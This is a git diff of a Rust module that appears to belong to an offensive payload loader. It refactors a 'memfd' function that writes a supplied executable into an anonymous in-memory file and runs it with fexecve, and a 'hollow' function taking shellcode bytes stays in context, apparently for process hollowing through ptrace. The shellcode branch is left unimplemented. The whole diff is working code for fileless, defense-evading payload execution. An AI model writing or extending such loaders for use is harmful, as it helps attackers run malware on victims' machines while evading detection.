@@ -1,4 +1,5 @@
-use crate::utils::{get_env, str_to_vec_c_string};
+use std::ffi::{c_void, CString};
+use std::os::fd::AsRawFd;
 
 use nix::errno::Errno;
 use nix::sys::memfd::{memfd_create, MemFdCreateFlag};
@@ -7,8 +8,9 @@ use nix::sys::ptrace::{detach, getregs, traceme};
 use nix::sys::wait::waitpid;
 use nix::unistd;
 use nix::unistd::{execve, fexecve, fork, ForkResult};
-use std::ffi::{c_void, CString};
-use std::os::fd::AsRawFd;
+
+use crate::utils::{get_env, str_to_vec_c_string};
+use crate::{Payload, PayloadType};
 
 pub fn hollow(target: &str, args: &str, shellcode_bytes: &[u8]) -> Result<(), Errno> {
     match unsafe { fork() } {
@@ -47,23 +49,29 @@ pub fn hollow(target: &str, args: &str, shellcode_bytes: &[u8]) -> Result<(), Er
     Ok(())
 }
 
-pub fn memfd(binary_name: &str, args: &str, binary_bytes: &[u8]) -> Result<(), Errno> {
+pub fn memfd(payload: Payload) -> Result<(), Errno> {
     let anon_file_name = CString::new("").unwrap();
     let p_file_name = anon_file_name.as_c_str();
 
     let fd = memfd_create(p_file_name, MemFdCreateFlag::MFD_CLOEXEC)?;
 
-    unistd::write(&fd, binary_bytes)?;
+    match payload.payload_type {
+        PayloadType::Executable => {
+            unistd::write(&fd, payload.bytes.as_slice())?;
 
-    let mut parsed_binary = str_to_vec_c_string(binary_name);
-    let mut parsed_args = str_to_vec_c_string(args);
-    parsed_binary.append(&mut parsed_args);
-    let parsed_binary_as_slice = parsed_binary.as_slice();
+            let mut args = str_to_vec_c_string(&payload.name);
+            args.append(&mut str_to_vec_c_string(&payload.args));
+            let args_slice = args.as_slice();
 
-    let env = get_env();
-    let env_as_slice = env.as_slice();
+            let env = get_env();
+            let env_slice = env.as_slice();
 
-    fexecve(fd.as_raw_fd(), parsed_binary_as_slice, env_as_slice)?;
+            fexecve(fd.as_raw_fd(), args_slice, env_slice)?;
+        }
+        PayloadType::Shellcode => {
+            todo!()
+        }
+    }
 
     Ok(())
 }
